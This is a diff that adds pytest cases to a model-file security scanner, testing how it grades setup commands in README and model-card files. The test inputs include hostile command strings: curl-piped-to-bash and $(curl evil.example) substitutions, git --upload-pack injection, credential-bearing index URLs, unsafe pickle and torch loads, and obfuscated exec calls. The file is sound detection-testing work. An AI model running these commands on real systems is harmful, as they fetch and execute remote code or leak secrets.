@@ -5477,6 +5477,531 @@ def _assert_requirements_actionable(tmp_path: Path, requirement_line: str) -> No
     assert determine_exit_code(aggregate) == 1
 
 
+@pytest.mark.parametrize("crlf", [False, True])
+@pytest.mark.parametrize(
+    "content",
+    [
+        "```bash\ngit clone https://github.com/ggml-org/llama.cpp.git  # build locally\n"
+        "# git clone --branch support https://github.com/example/llama.cpp.git\n"
+        "cd llama.cpp\ncmake -B build -DGGML_CUDA=ON\ncmake --build build --config Release -j\n```\n",
+        "```shell\nconda create -n demo python=3.12\nconda activate demo\n"
+        "git clone https://github.com/example/model.git\ncd model\npip install -e .\n```\n",
+        "```bash\ngit clone https://github.com/owner/repo.git repo\n```\n",
+        "```console\ngit clone https://github.com/owner/repo.git\n```\n",
+        "```terminal\n$ git clone https://github.com/owner/repo.git\n```\n",
+        "```bash\ngit clone --depth 1 https://github.com/owner/repo.git ./models/repo\n```\n",
+        "```bash\ngit clone --depth=1 https://github.com/owner/repo.git\n```\n",
+        "```bash\ngit clone -- https://github.com/owner/repo.git\n```\n",
+        "> ```bash\n> git clone https://github.com/owner/repo.git\n> ```\n",
+        "> > ```bash\n> > git clone https://github.com/owner/repo.git\n> > ```\n",
+        "```bash\ngit clone https://github.com/owner/repo.git # clone into $HOME\n```\n",
+        "```bash\ngit clone https://github.com/owner/repo.git # examples: $(pwd), `pwd`, pipes | and ;\n```\n",
+        "```bash\ngit clone --branch=release --depth=1 -- https://github.com/owner/repo.git repo\n```\n",
+        "```bash\npip install --extra-index-url=https://download.pytorch.org/whl/ torch\n```\n",
+        "```bash\npython -m pip install --index-url=https://pypi.org/simple/ torch\n```\n",
+        "```bash\npython3 -m pip install --index-url=https://pypi.org/simple/ torch\n```\n",
+        "```bash\npython3.12 -m pip install --index-url=https://pypi.org/simple/ torch\n```\n",
+        "```bash\ngit clone https://github.com/owner/repo.git\ncmake -B build -DAPP_INCLUDE_TESTS=ON\n```\n",
+        "```bash\nuv pip install --pre vllm==0.10.1+gptoss \\\n"
+        "  --extra-index-url https://wheels.vllm.ai/gpt-oss/ \\\n"
+        "  --extra-index-url https://download.pytorch.org/whl/nightly/cu128 \\\n"
+        "  --index-strategy unsafe-best-match\nvllm serve openai/gpt-oss-20b\n```\n",
+        '```python\nfrom openai import OpenAI\nclient = OpenAI(\nbase_url="http://localhost:8000/v1",\napi_key="EMPTY",\n)\n```\n',
+        '~~~py\nclient = OpenAI(base_url="http://127.0.0.1:8001/v1/")\n~~~\n',
+        '```python\nclient = OpenAI(base_url="http://[::1]:8000/v1")\n```\n',
+        '> ```python\n> client = OpenAI(base_url="http://localhost:8000/v1")\n> ```\n',
+        '```python\nsystem = "You are helpful"\nclient = OpenAI(base_url="http://localhost:8000/v1")\n'
+        'messages = [{"role": "system", "content": system}]\n```\n',
+        '```python\nclient = OpenAI(base_url=os.getenv("OPENAI_BASE_URL", "http://localhost:8000/v1"))\n```\n',
+        '```python\nllm_cfg = {"model": "demo", "model_server": "http://localhost:8000/v1", "api_key": "EMPTY"}\n```\n',
+        '```python\nmessages = [{"role": "user", "content": '
+        '"https://qwenlm.github.io/blog/ Introduce Qwen developments"}]\n'
+        "for response in bot.run(messages=messages):\n    pass\n```\n",
+    ],
+)
+def test_routine_documented_examples_are_informational(tmp_path: Path, content: str, crlf: bool) -> None:
+    path = tmp_path / "model_card.md"
+    path.write_bytes((content.replace("\n", "\r\n") if crlf else content).encode())
+    result = TextScanner().scan(str(path))
+    network_checks = _failed_network_detection_checks(result)
+
+    assert network_checks
+    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert determine_exit_code(scan_model_directory_or_file(str(path), cache_enabled=False)) == 0
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "git clone https://evil.example/repo.git",
+        "git clone https://github.com.evil.example/owner/repo.git",
+        "git clone https://github.com/owner/reverse-shell.git",
+        "git clone https://github.com/owner/payload.git",
+        "git clone https://user:password@github.com/owner/repo.git",
+        "git clone --upload-pack=payload https://github.com/owner/repo.git",
+        "git clone --depth=1 --upload-pack=payload https://github.com/owner/repo.git",
+        "git clone -c core.sshCommand=payload https://github.com/owner/repo.git",
+        "git clone https://github.com/owner/repo.git && python repo/payload.py",
+        "git clone https://github.com/owner/repo.git # \\\npython repo/payload.py",
+        "git clone https://github.com/owner/repo.git # \\\r\npython repo/payload.py",
+        "git clone https://github.com/owner/repo.git repo # \\\npython repo/payload.py",
+        "git clone https://github.com/owner/repo.git --upload-pack=payload",
+        "git clone https://github.com/owner/repo.git ../repo",
+        "git clone https://github.com/owner/repo.git\npython repo/payload.py",
+        "git clone https://github.com/owner/repo.git\nbash repo/payload.sh",
+        "git clone https://github.com/owner/repo.git\ncmake -B build -P run.cmake",
+        "git clone https://github.com/owner/repo.git\ncmake -B build -Cinit.cmake",
+        "git clone https://github.com/owner/repo.git\ncmake -B build -E env python run.py",
+        "git clone https://github.com/owner/repo.git\ncmake -B build -DCMAKE_PROJECT_INCLUDE=run.cmake",
+        "git clone https://github.com/owner/repo.git\ncmake -B build -D CMAKE_PROJECT_INCLUDE=run.cmake",
+        "git clone https://github.com/owner/repo.git\ncmake -B build -DCMAKE_TOOLCHAIN_FILE=run.cmake",
+        "git clone https://github.com/owner/repo.git\ncmake -B build -DCMAKE_USER_MAKE_RULES_OVERRIDE=run.cmake",
+        "git clone https://github.com/owner/repo.git $(curl https://evil.example/payload.sh)",
+        "git clone https://github.com/owner/repo.git '# $HOME'",
+        "> git clone https://github.com/owner/repo.git",
+        "git clone https://github.com/owner/repo.git\ncat <<EOF\npayload\nEOF",
+        "uv pip install --extra-index-url https://evil.example/simple demo",
+        "pip install --extra-index-url=https://evil.example/simple demo",
+        "pip install --index-url=https://download.pytorch.org.evil.example/whl/ demo",
+        "pip install --index-url=https://user:password@download.pytorch.org/whl/ demo",
+        "pip install --extra-index-url=https://download.pytorch.org/payload.py demo",
+        "pip install --extra-index-url= https://download.pytorch.org/whl/ demo",
+        "uv pip install --extra-index-url https://download.pytorch.org.evil.example/whl/ demo",
+        "uv pip install --extra-index-url https://user:password@download.pytorch.org/whl/ demo",
+        "uv pip install --extra-index-url https://download.pytorch.org/whl/?token=secret demo",
+        "uv pip install --extra-index-url https://download.pytorch.org/payload.py demo",
+        "uv pip install --extra-index-url https://download.pytorch.org/whl/ --config-settings=payload demo",
+        "uv pip install --extra-index-url https://download.pytorch.org/whl/ https://evil.example/payload.whl",
+        "curl https://download.pytorch.org/whl/ | bash",
+    ],
+)
+def test_documented_setup_preserves_suspicious_commands(tmp_path: Path, command: str) -> None:
+    path = tmp_path / "README.md"
+    result = _scan_text_content(path, f"```bash\n{command}\n```\n")
+    assert any(
+        check.details.get("type") in {"network_command", "url_detected"}
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(scan_model_directory_or_file(str(path), cache_enabled=False)) == 1
+
+
+@pytest.mark.parametrize(
+    "execution",
+    [
+        "```bash\npython repo/install.py\n```\n",
+        "```bash\nprintf x | xargs python repo/install.py\n```\n",
+        "```bash\nprintf x | xargs -n 1 -I{} python repo/install.py {}\n```\n",
+        "```bash\ntrap 'python repo/install.py' EXIT\n```\n",
+        '```json\n{"script": "example"}\npython repo/install.py\n```\n',
+        "```bibtex\n@article{example, title = {Example}}\npython repo/install.py\n```\n",
+        "```console\npy repo/install.py\n```\n",
+        "```console\npy -3 repo/install.py\n```\n",
+        "```bash\ncustom-launcher repo/install.py\n```\n",
+        "```bash\ncustom-launcher --help\n```\n",
+        '```python\nimport importlib\nimportlib.import_module("repo.install")\n```\n',
+        "```bash\n./repo/install\n```\n",
+        "```bash\nrepo/bin/tool\n```\n",
+        "```bash\n./repo/install --version\n```\n",
+        "```bash\nenv ./repo/install\n```\n",
+        "```bash\ntime repo/bin/tool\n```\n",
+        "```bash\n'./repo/install'\n```\n",
+        "```bash\n'.\\repo\\install'\n```\n",
+        "Run `./repo/install` next.\n",
+        "Run repo/bin/tool next.\n",
+        "<pre><code>./repo/install</code></pre>\n",
+        '```bash\necho "$(python repo/install.py)"\n```\n',
+        '```bash\necho "\\\\$(python repo/install.py)"\n```\n',
+        "```bash\npy\\\nthon repo/install.py\n```\n",
+        "```bash\npy\\\r\nthon repo/install.py\n```\n",
+        '```bash\necho "$(py\\\nthon repo/install.py)"\n```\n',
+        '```python\nfrom subprocess import call\ncall(["python", "repo/install.py"])\n```\n',
+        '```python\nfrom subprocess import Popen as launch\nlaunch(["python", "repo/install.py"])\n```\n',
+        "```bash\ncat <<'EOF'\npython repo/install.py\nEOF\npython repo/install.py\n```\n",
+        "```bash\ncat <<'EOF'\npython repo/install.py\n```\n",
+        "```bash\nbash <<'EOF'\npython repo/install.py\nEOF\n```\n",
+        "```bash\necho foo#bar; python repo/install.py\n```\n",
+        "```bash\npython${IFS}-m${IFS}repo.install\n```\n",
+        "```bash\n> output.log python repo/install.py\n```\n",
+        "```bash\n{log}> output.log python repo/install.py\n```\n",
+        "```bash\nif python repo/install.py; then :; fi\n```\n",
+        "```bash\nwhile python repo/install.py; do :; done\n```\n",
+        "```bash\nuntil python repo/install.py; do :; done\n```\n",
+        "```bash\ntime python repo/install.py\n```\n",
+        "```bash\ntime -p python repo/install.py\n```\n",
+        "```bash\n{ python repo/install.py; }\n```\n",
+        "```bash\n>output.log python repo/install.py\n```\n",
+        "```bash\n2> output.log python repo/install.py\n```\n",
+        "```bash\n2>>output.log python repo/install.py\n```\n",
+        "```bash\n<input.txt python repo/install.py\n```\n",
+        "```bash\nenv >output.log python repo/install.py\n```\n",
+        "```console\n./repo/install.exe\n```\n",
+        "```bash\n./repo/install.exe --help\n```\n",
+        "```console\n./repo/install.EXE\n```\n",
+        "```console\n./repo/install.com\n```\n",
+        '```python\nfrom ctypes import CDLL\nCDLL("./repo/plugin.so")\n```\n',
+        '```python\nfrom ctypes import CDLL as load\nload("./repo/plugin.so")\n```\n',
+        '```python\nimport ctypes as c\nc.CDLL("./repo/plugin.so")\n```\n',
+        '```python\nfrom ctypes import cdll\ncdll.LoadLibrary("./repo/plugin.so")\n```\n',
+        '```python\nfrom cffi import FFI\nFFI().dlopen("./repo/plugin.so")\n```\n',
+        "```console\n$ python${IFS}-m${IFS}repo.install\n```\n",
+        "```bash\nvllm serve ./repo --trust-remote-code\n```\n",
+        "```bash\nvllm serve ./repo --trust-remote-code=true\n```\n",
+        "```bash\nvllm serve ./repo --middleware repo.install\n```\n",
+        "```bash\nvllm serve ./repo --tool-parser-plugin repo/install.py\n```\n",
+        "```bash\nvllm serve ./repo --unrecognized-option value\n```\n",
+        '```python\nimport os\nos.execv("./repo/install.py", ["install.py"])\n```\n',
+        '```python\nfrom os import execv as launch\nlaunch("./repo/install.py", ["install.py"])\n```\n',
+        '```python\nimport os\nos.posix_spawn("./repo/install.py", ["install.py"], {})\n```\n',
+        '```python\nimport pickle\npickle.load(open("repo/model.pkl", "rb"))\n```\n',
+        '```python\nimport pickle\npickle.Unpickler(open("repo/model.pkl", "rb")).load()\n```\n',
+        "```python\nfrom pickle import Unpickler as Loader\nloader = Loader(stream)\nloader.load()\n```\n",
+        '```python\nimport builtins\ngetattr(builtins, "exec")(open("repo/install.py").read())\n```\n',
+        '```python\nimport builtins\nlaunch = getattr(builtins, "exec")\nlaunch(source)\n```\n',
+        '```python\n__builtins__["exec"](source)\n```\n',
+        '```python\nlaunch = __builtins__["exec"]\nlaunch(source)\n```\n',
+        "```python\nimport pickle as p\np.loads(data)\n```\n",
+        "```python\nfrom pickle import load as deserialize\ndeserialize(stream)\n```\n",
+        '```python\nimport torch\ntorch.load("repo/model.pt", weights_only=False)\n```\n',
+        '```python\nfrom torch import load as deserialize\ndeserialize("repo/model.pt", weights_only=False)\n```\n',
+        "```\npython repo/install.py\n```\n",
+        "```\nrepo/install.py --help\n```\n",
+        "```console\n$ python repo/install.py\n```\n",
+        "```terminal\n$ python3 repo/install.py\n```\n",
+        "```powershell\n& ./repo/install.ps1\n```\n",
+        "```javascript\nrequire('child_process').execFileSync('node', ['repo/install.js']);\n```\n",
+        "```ruby\nload './repo/install.rb'\n```\n",
+        "```powershell title=setup\n& ./repo/install.ps1\n```\n",
+        "```powershell title=setup\n& ./repo/install.ps1\n",
+        "    python repo/install.py\n",
+        "\tpython repo/install.py\n",
+        "    import runpy\n\n    runpy.run_path('repo/install.py')\n",
+        "Run `python repo/install.py` next.\n",
+        "Run ``python repo/install.py`` next.\n",
+        "Run `python\nrepo/install.py` next.\n",
+        "Run `./repo/install.py` next.\n",
+        "Then use `runpy.run_path('repo/install.py')`.\n",
+        "An unmatched `` marker. Run `python repo/install.py` next.\n",
+        "Escaped \\` marker. Run `python repo/install.py` next.\n",
+        "Escaped \\``python repo/install.py` next.\n",
+        "<pre><code>python repo/install.py</code></pre>\n",
+        "<PRE class='shell'><CODE>python repo/install.py</CODE></PRE>\n",
+        "<pre>python&#32;repo/install.py</pre>\n",
+        "<pre><code><span>python</span> repo/install.py</code></pre>\n",
+        "<pre><code>cd repo<br>python install.py</code></pre>\n",
+        "<pre><code class='language-ruby'>load './repo/install.rb'</code></pre>\n",
+        "<pre><code>python repo/install.py\n",
+        "Run <code>python repo/install.py</code> next.\n",
+        "Run <code>./repo/install.py</code> next.\n",
+        "Run python repo/install.py next.\n",
+        "Run: python repo/install.py next.\n",
+        "Run:python repo/install.py next.\n",
+        "Run: `./repo/install.py` next.\n",
+        "Run: <code>./repo/install.py</code> next.\n",
+        "Run`./repo/install.py` next.\n",
+        "Run<code>./repo/install.py</code> next.\n",
+        "Run — python repo/install.py next.\n",
+        "Execute:\npython repo/install.py next.\n",
+        "Run the following command:\npython repo/install.py\n",
+        "Run the following command:\n\npython repo/install.py\n",
+        "Run the following command:\r\npython repo/install.py\r\n",
+        "Run the following command\npython repo/install.py\n",
+        ">     python repo/install.py\n",
+        "> >     python repo/install.py\n",
+        "> ```bash\n> python repo/install.py\n> ```\n",
+        "> ```bash\n> python repo/install.py\n",
+        "Next, execute bash repo/install.sh to finish setup.\n",
+        "Launch ./repo/install.py next.\n",
+        'Run "python" repo/install.py next.\n',
+        "Run python repo/install.py when you're ready.\n",
+        "<p>Run <b>python</b> repo/install.py next.</p>\n",
+        "Run runpy.run_path('repo/install.py') next.\n",
+        "```bash\n./repo/install.sh\n```\n",
+        "```bash\n./repo/install.py --help\n```\n",
+        "```bash\nexec -a installer python repo/install.py\n```\n",
+        "```bash\npython3 -m repo.install\n```\n",
+        "```bash\nPython.exe repo/install.py\n```\n",
+        "```bash\npython3 \\\n repo/install.py\n```\n",
+        '```bash\n"python3" repo/install.py\n```\n',
+        '```bash\npyt""hon3 repo/install.py\n```\n',
+        "```bash\nenv MODE=setup python3 repo/install.py\n```\n",
+        "```bash\ncd repo && bash install.sh\n```\n",
+        "```bash\nuv run repo/install.py\n```\n",
+        "```bash\neval 'python repo/install.py'\n```\n",
+        "```bash\necho `python repo/install.py`\n```\n",
+        "```bash\nlauncher=python\n$launcher repo/install.py\n```\n",
+        "```bash\ncmake -B build -P repo/install.cmake\n```\n",
+        "```python\nimport subprocess\nsubprocess.run(['python', 'repo/install.py'])\n```\n",
+        "```python\nimport runpy\nrunpy.run_path('repo/install.py')\n```\n",
+        "```bash\npython repo/install.py\n",
+    ],
+)
+def test_documented_clone_script_chains_across_blocks_remain_actionable(tmp_path: Path, execution: str) -> None:
+    content = "```bash\ngit clone https://github.com/owner/repo.git\n```\n\nRun the next step:\n\n" + execution
+    result = _scan_text_content(tmp_path / "README.md", content)
+    assert any(
+        check.details.get("type") == "network_command"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(scan_model_directory_or_file(str(tmp_path / "README.md"), cache_enabled=False)) == 1
+
+
+@pytest.mark.parametrize(
+    "prefix,indent",
+    [
+        ("- Setup\n\n", "    "),
+        ("1. Setup\n\n", "    "),
+        ("- Setup\n  - Install\n\n", "      "),
+        ("> - Setup\n>\n", ">    "),
+    ],
+)
+@pytest.mark.parametrize("execute", [False, True])
+def test_documented_clone_in_list_fences_preserves_policy(
+    tmp_path: Path, prefix: str, indent: str, execute: bool
+) -> None:
+    content = prefix + "\n".join(
+        indent + line for line in ["```bash", "git clone https://github.com/owner/repo.git", "```", ""]
+    )
+    if execute:
+        content += "\n".join(indent + line for line in ["```bash", "python repo/install.py", "```", ""])
+    path = tmp_path / "README.md"
+    result = _scan_text_content(path, content)
+    checks = [check for check in result.checks if check.details.get("type") == "network_command"]
+    assert checks
+    assert any(check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for check in checks) is execute
+    assert determine_exit_code(scan_model_directory_or_file(str(path), cache_enabled=False)) == int(execute)
+
+
+@pytest.mark.parametrize("complete", [False, True])
+def test_documented_clone_fence_on_list_marker(tmp_path: Path, complete: bool) -> None:
+    content = "- ```bash\n  git clone https://github.com/owner/repo.git\n" + ("  ```\n" if complete else "")
+    path = tmp_path / "README.md"
+    result = _scan_text_content(path, content)
+    checks = [check for check in result.checks if check.details.get("type") == "network_command"]
+    assert checks
+    assert any(check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for check in checks) is not complete
+    assert determine_exit_code(scan_model_directory_or_file(str(path), cache_enabled=False)) == int(not complete)
+
+
+@pytest.mark.parametrize(
+    "following",
+    [
+        "```bash\npip install -e .\n```\n",
+        "```bash\npython3 -m pip install --index-url=https://pypi.org/simple/ torch\n```\n",
+        "```bash\npython3 --version\n```\n",
+        "```bash\npython3 -h\n```\n",
+        "```bash\ncommand -v python3\n```\n",
+        "```console\n$ python3 --version\n```\n",
+        "```console\n$ command -v python3\n```\n",
+        '```bash\necho "python repo/install.py"\n```\n',
+        "```bash\necho '`python repo/install.py`'\n```\n",
+        "```bash\necho '$(python repo/install.py)'\n```\n",
+        '```bash\necho "\\$(python repo/install.py)"\n```\n',
+        '```bash\necho "\\`python repo/install.py\\`"\n```\n',
+        "```bash\ncat <<'EOF'\npython repo/install.py\nEOF\n```\n",
+        '```bash\ncat <<"EOF"\n$(python repo/install.py)\nEOF\n```\n',
+        "```bash\ncat <<-'EOF'\n\tpython repo/install.py\n\tEOF\n```\n",
+        "```bash\necho foo # python repo/install.py\n```\n",
+        "```bash\necho foo;# python repo/install.py\n```\n",
+        '```bash\necho "foo#bar; python repo/install.py"\n```\n',
+        "```bash\necho 'python${IFS}-m${IFS}repo.install'\n```\n",
+        '```bash\necho "${HOME}"\n```\n',
+        '```bash\necho "./repo/install.exe"\n```\n',
+        '```bash\necho "./repo/install"\n```\n',
+        "```bash\nls repo/bin\n```\n",
+        "```bash\ncat repo/install\n```\n",
+        "```bash\ncommand -v ./repo/bin/tool\n```\n",
+        "The file `repo/bin/tool` contains the installer.\n",
+        '```python\nprint("ctypes.CDLL(./repo/plugin.so)")\n```\n',
+        "```python\nimport ctypes\nvalue = ctypes.c_int(1)\n```\n",
+        "```console\nPython.exe --version\n```\n",
+        "```console\npy --version\n```\n",
+        "```bash\necho 'trap python repo/install.py EXIT'\n```\n",
+        '```python\nimport pickle\npickle.Pickler(stream).dump({"value": 1})\n```\n',
+        '```python\nprint("pickle.Unpickler(stream).load()")\n```\n',
+        '```python\nname = getattr(model, "name")\n```\n',
+        "Run the following command:\npython --version\n",
+        '```bash\n>output.log echo "python repo/install.py"\n```\n',
+        "```bash\n> output.log python --version\n```\n",
+        '```bash\nif python --version; then echo "python repo/install.py"; fi\n```\n',
+        '```bash\ntime echo "python repo/install.py"\n```\n',
+        'Run the following command:\n\necho "python repo/install.py"\n',
+        "```bash\nvllm serve ./repo\n```\n",
+        "```bash\nvllm serve ./repo --host 0.0.0.0 --port=8000 --tensor-parallel-size 2\n```\n",
+        '```python\nimport torch\ntorch.load("repo/model.pt", weights_only=True)\n```\n',
+        '```\nprint("repo/install.py")\n```\n',
+        '```\n"repo/install.py"\n```\n',
+        '```json\n{"script": "repo/install.py"}\n```\n',
+        "```bibtex\n@article{example,\n    title = {Example model}\n}\n```\n",
+        '    print("python repo/install.py")\n',
+        "    python3 --version\n",
+        "The file `repo/install.py` contains the installer.\n",
+        "The `subprocess.run` API can invoke subprocesses.\n",
+        "Check `python3 --version` first.\n",
+        'Print a path with `print("repo/install.py")`.\n',
+        '    print("`python repo/install.py`")\n',
+        "<pre><code>python3 --version</code></pre>\n",
+        '<pre><code>print("python repo/install.py")</code></pre>\n',
+        "The file <code>repo/install.py</code> contains the installer.\n",
+        "The `<pre><code>` tags display code examples.\n",
+        "The &lt;pre&gt;&lt;code&gt; tags display code examples.\n",
+        "Run python3 --version\n",
+        "Run: python3 --version\n",
+        "> ```bash\n> python3 --version\n> ```\n",
+        ">     python3 --version\n",
+        "Run <b>python3</b> --version\n",
+        "Run the example when you're ready.\n",
+        "The source code is available in the cloned repository.\n",
+        "<!-- Run python repo/install.py next. -->\n",
+        '```bash\necho "&&" python repo/install.py\n```\n',
+        '```python\nclient = OpenAI(base_url="http://localhost:8000/v1")\n```\n',
+    ],
+)
+def test_documented_clone_with_separate_routine_examples_is_informational(tmp_path: Path, following: str) -> None:
+    content = "```bash\ngit clone https://github.com/owner/repo.git\n```\n\n" + following
+    result = _scan_text_content(tmp_path / "README.md", content)
+    checks = _failed_network_detection_checks(result)
+    assert checks and all(check.severity == IssueSeverity.INFO for check in checks)
+    assert determine_exit_code(scan_model_directory_or_file(str(tmp_path / "README.md"), cache_enabled=False)) == 0
+
+
+@pytest.mark.parametrize(
+    "url",
+    [
+        "https://evil.example/v1",
+        "http://localhost.evil.example:8000/v1",
+        "http://localhost:8000@evil.example/v1",
+        "http://user:password@localhost:8000/v1",
+        "http://localhost:1337/v1",
+        "http://localhost:8080/v1",
+        "http://localhost:8000/shell",
+        "http://localhost:8000/payload.py",
+        "http://localhost:8000/v1?token=secret",
+        "http://localhost:8000/v1#payload",
+        "http://localhost:8000/%76%31",
+    ],
+)
+def test_documented_client_preserves_suspicious_endpoints(tmp_path: Path, url: str) -> None:
+    _assert_documentation_network_actionable(
+        tmp_path, f'```python\nclient = OpenAI(base_url="{url}")\n```\n', "url_detected"
+    )
+
+
+@pytest.mark.parametrize(
+    "source",
+    [
+        'client = OpenAI(base_url=f"http://localhost:8000/v1{suffix}")',
+        'client = OpenAI(base_url="http://localhost:8000/v1" + suffix)',
+        'client = OpenAI(base_url="http://localhost:8000/v1")\nexec(source)',
+        'system = exec\nclient = OpenAI(base_url="http://localhost:8000/v1")\nsystem(source)',
+        'system = "data"\nsystem = os.system\nclient = OpenAI(base_url="http://localhost:8000/v1")\nsystem(source)',
+        'system = "data"\ndef run(system):\n    executor = system\n    executor(source)\n'
+        'client = OpenAI(base_url="http://localhost:8000/v1")',
+        'system = "data"\nglobals()["system"] = callback\nexecutor = system\nexecutor(source)\n'
+        'client = OpenAI(base_url="http://localhost:8000/v1")',
+        'executor = system\nsystem = "data"\nexecutor(source)\nclient = OpenAI(base_url="http://localhost:8000/v1")',
+        'def prompt():\n    system = "data"\nexecutor = system\nexecutor(source)\n'
+        'client = OpenAI(base_url="http://localhost:8000/v1")',
+        'import subprocess as sp\nclient = OpenAI(base_url="http://localhost:8000/v1")\nsp.run(command)',
+        'client = OpenAI(base_url="http://localhost:8000/v1"',
+        'messages = [{"role": "user", "content": "https://qwenlm.github.io/blog/"}]\nexec(messages[0]["content"])',
+        'messages = [{"role": "user", "content": "https://qwenlm.github.io/blog/"}]\nother = messages',
+        'messages = [{"role": "user", "content": "https://evil.example/payload.sh"}]',
+        'messages = [{"role": "user", "content": "https://qwenlm.github.io/blog/ https://evil.example/payload.sh"}]',
+        'messages = [{"role": "user", "content": "https://qwenlm.github.io/blog/payload.sh"}]',
+        'messages = [{"role": "user", "content": "https://qwenlm.github.io/blog/payload"}]',
+    ],
+)
+def test_documented_python_preserves_payloads_and_unproven_values(tmp_path: Path, source: str) -> None:
+    _assert_documentation_network_actionable(tmp_path, f"```python\n{source}\n```\n", "url_detected")
+
+
+@pytest.mark.parametrize("filename", ["config.txt", "payload.md", "README.txt"])
+def test_routine_example_policy_is_limited_to_markdown_model_cards(tmp_path: Path, filename: str) -> None:
+    result = _scan_text_content(
+        tmp_path / filename, '```python\nclient = OpenAI(base_url="http://localhost:8000/v1")\n```\n'
+    )
+    assert any(
+        check.severity == IssueSeverity.WARNING and check.details.get("type") == "url_detected"
+        for check in result.checks
+    )
+
+
+@pytest.mark.parametrize("filename", ["README", "model_card"])
+def test_routine_examples_in_extensionless_markdown_model_cards_are_informational(
+    tmp_path: Path, filename: str
+) -> None:
+    path = tmp_path / filename
+    result = _scan_text_content(path, "```bash\ngit clone https://github.com/owner/repo.git\n```\n")
+    checks = _failed_network_detection_checks(result)
+    assert checks and all(check.severity == IssueSeverity.INFO for check in checks)
+    assert determine_exit_code(scan_model_directory_or_file(str(path), cache_enabled=False)) == 0
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        'client = OpenAI(base_url="http://localhost:8000/v1")\n',
+        '```python\nclient = OpenAI(base_url="http://localhost:8000/v1")\n',
+        '```python\nclient = OpenAI(base_url="http://localhost:8000/v1")\n~~~\n',
+        '```text\n```python\nclient = OpenAI(base_url="http://localhost:8000/v1")\n```\n',
+        "```python\n# " + "x" * (16 * 1024) + '\nclient = OpenAI(base_url="http://localhost:8000/v1")\n```\n',
+        "```text\nexample\n```\n" * 129 + '```python\nclient = OpenAI(base_url="http://localhost:8000/v1")\n```\n',
+    ],
+)
+def test_routine_example_policy_requires_complete_bounded_fences(tmp_path: Path, content: str) -> None:
+    _assert_documentation_network_actionable(tmp_path, content, "url_detected")
+
+
+def test_routine_example_policy_bounds_whole_document_analysis(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
+    from modelaudit.scanners.text_scanner_support import documentation_examples
+
+    def unexpected_parse(_payload: bytes) -> None:
+        pytest.fail("An oversized document reached Markdown parsing")
+
+    monkeypatch.setattr(documentation_examples, "_without_markdown_container_prefixes", unexpected_parse)
+    content = "```bash\ngit clone https://github.com/owner/repo.git\n```\n" + "x" * (
+        documentation_examples.MAX_DOCUMENTATION_BYTES + 1
+    )
+    _assert_documentation_network_actionable(tmp_path, content, "network_command")
+
+
+def test_routine_example_does_not_hide_later_same_url_execution(tmp_path: Path) -> None:
+    content = (
+        '```python\nclient = OpenAI(base_url="http://localhost:8000/v1")\n```\n'
+        '```python\nexec(requests.get("http://localhost:8000/v1").text)\n```\n'
+    )
+    result = _scan_text_content(tmp_path / "README.md", content)
+    checks = [check for check in result.checks if check.details.get("type") == "url_detected"]
+    assert [check.severity for check in checks] == [IssueSeverity.INFO, IssueSeverity.WARNING]
+    _assert_documentation_network_actionable(tmp_path, content, "network_function")
+
+
+def test_routine_example_keeps_blacklisted_destination_alerts(tmp_path: Path) -> None:
+    path = tmp_path / "README.md"
+    path.write_text("```bash\ngit clone https://github.com/example/model.git\n```\n", encoding="utf-8")
+    result = TextScanner({"network_comm_config": {"custom_blacklist": ["github.com/example"]}}).scan(str(path))
+    assert any(
+        check.details.get("type") == "blacklisted_domain" and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "git clone https://github.com/owner/repo.git $(python payload.py)",
+        'echo "\ngit clone https://github.com/owner/repo.git\n"',
+        "git clone https://github.com/owner/repo.git\x0bpython payload.py",
+    ],
+)
+def test_routine_setup_proof_rejects_shell_substitution_and_incomplete_strings(command: str) -> None:
+    from modelaudit.scanners.text_scanner_support.documentation_examples import routine_documentation_url_spans
+
+    assert routine_documentation_url_spans(f"```bash\n{command}\n```\n".encode()) == ()
+
+
 def _assert_documentation_routed_to_text(tmp_path: Path, filename: str) -> None:
     text_path = tmp_path / filename
     text_path.write_text('requests.get("https://evil.example/payload")\n', encoding="utf-8")
